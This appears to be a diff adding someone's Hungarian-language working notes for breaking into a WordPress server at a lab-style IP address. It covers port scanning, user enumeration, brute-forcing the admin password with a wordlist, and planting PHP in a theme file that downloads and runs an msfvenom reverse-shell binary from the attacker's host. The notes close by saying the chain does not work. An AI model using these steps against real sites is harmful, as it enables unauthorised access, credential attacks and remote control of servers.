@@ -1,0 +1,44 @@
+celgep: 40.0.4.9
+
+
+
+sudo nmap -sS -sV -p 1-1500 40.0.4.9 	/-p port mettol meddig
+
+weboldalt talaltunk vele: http://40.0.4.9
+!!WORDPRESS oldal!!
+
+//
+wpscan.com - ingyenes api token
+//
+
+sudo wpscan --url http://40.0.4.9 -e u,at,ap
+(amint megvan a nev)
+sudo wpscan --url http://40.0.4.9 -U admin -P /usr/share/wordlists/rockyou.txt (elso 5000 ben lesz benne) ha nem a rockyou akkor valami masban van
+
+kiirja: password: finalfantasy
+
+http://40.0.4.9/wp-admin
+
+1. opcio
+
+Appearance azon belul Theme Editor - Theme Files  - comments.php (kod kell bele)
+
+php exec manual copypaste:
+<?php
+// outputs the username that owns the running php/httpd process
+// (on a system with the "whoami" executable in the path)
+exec('cd /tmp;rm -f /tmp/revshell;wget http://sajatipnk:portaltalaba8000/revshell;chmod 777 /tmp/revshell;/tmp/revshell', $output, $result_code);
+echo "Returned with status $result_code and output:\n";
+print_r($output);
+?>
+
+!!revshell lesz a neve!!
+
+
+msfvenom -p Linux/x64/shell_reverse_tcp LHOST=30.0.1.10 LPORT=4444 -f elf > revshell
+python 3 -m http.server 8000
+
+masik terminal:
+nc 
+
+idk nem mukszik
